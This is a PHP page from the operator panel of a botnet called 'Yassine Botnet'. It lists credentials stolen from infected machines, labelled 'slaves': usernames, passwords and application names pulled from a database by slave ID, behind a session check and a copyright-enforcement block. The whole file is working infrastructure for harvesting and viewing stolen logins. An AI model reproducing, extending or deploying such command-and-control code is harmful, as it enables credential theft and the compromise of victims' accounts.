<?
session_start();
include("../../includes/configuration.inc.php");
include("../../includes/mysql_connect.inc.php");
if($_SESSION['botnet_session'] != $security_token) 
{
echo "<script>window.location='../../index.php';</script>";
}
?>
<html>
<head>
<title>Yassine Botnet</title>
<link rel="stylesheet" type="text/css" href="../../style/plugins.css">
<link rel="stylesheet" type="text/css" href="../style/main.css">
<link rel="stylesheet" type="text/css" href="style/cmd.css">
<link rel="stylesheet" type="text/css" href="http://fonts.googleapis.com/css?family=Lobster">
<?
if(file_exists("../../yassin.php")) 
{
$checker = fopen("../../yassin.php","r");
$copyrights = fgets($checker);
if ($copyrights != "Yassin Taktak") 
{
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
}else {
echo("<div id='bad_report'>Changing Copyrights Is illegal.</div>");
exit();
}
?>
</head>
<body><center>
<br>
<font size="30" color="#009999" face="Lobster">PASSWORDS LIST</font>
<br><br>
<div class="datagrid">
<center>
<table width="90%"  border="1">
<thead><tr><th>SLAVE ID</th><th>USERNAME</th><th>PASSWORD</th><th>APPLICATION</th></thead>
<tbody>
<?
$slave_id = $_GET['slave'];
$slave_id = htmlentities($slave_id);
$slave_id = mysql_escape_string($slave_id);
$querry_secs = "SELECT username, password, application FROM passwords WHERE slave_id='$slave_id'";
$result4 = mysql_query($querry_secs, $connect);
while($row = mysql_fetch_array($result4) ){
 $username = $row[0];
 $password = $row[1];
 $application = $row[2];
 ?>
<td align="center"><? echo $slave_id ?></td><td><? echo $username ?></td><td><? echo $password ?></td><td><? echo $application ?></td></tr>
<?
}
?>
</tbody>
</table></div>
<br>
<form action="../show_slaves.php">
<input type="submit" class="submitbox" value="RETURN TO SHOW SLAVES PAGE" name="submit">
</form>
</center>
</body>
</html>